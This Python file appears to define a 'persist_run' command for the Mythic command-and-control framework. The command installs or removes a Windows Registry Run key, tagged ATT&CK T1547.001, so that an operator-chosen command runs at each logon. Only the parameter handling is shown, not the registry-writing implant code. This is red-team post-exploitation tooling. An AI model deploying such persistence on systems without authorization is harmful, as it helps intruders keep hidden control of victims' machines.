from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class PersistRunArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                choices=["install", "remove"],
                default_value="install",
                description="Install or remove the run key",
            ),
            CommandParameter(
                name="name",
                type=ParameterType.String,
                description="Registry value name for the run key entry",
            ),
            CommandParameter(
                name="command",
                type=ParameterType.String,
                description="Command/path to execute on logon (required for install)",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="hkcu",
                type=ParameterType.Boolean,
                default_value=True,
                description="Use HKCU (True) or HKLM (False)",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)


class PersistRunCommand(CommandBase):
    cmd = "persist_run"
    needs_admin = False
    help_cmd = "persist_run"
    description = "Install or remove a Windows Registry Run key for persistence"
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1547.001"]
    argument_class = PersistRunArguments
    attributes = CommandAttributes(builtin=False, supported_os=[SupportedOS.Windows])

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )
        action = taskData.args.get_arg("action")
        name = taskData.args.get_arg("name")
        command = taskData.args.get_arg("command")
        response.DisplayParams = f"{action} {name}" + (f" -> {command}" if command else "")
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
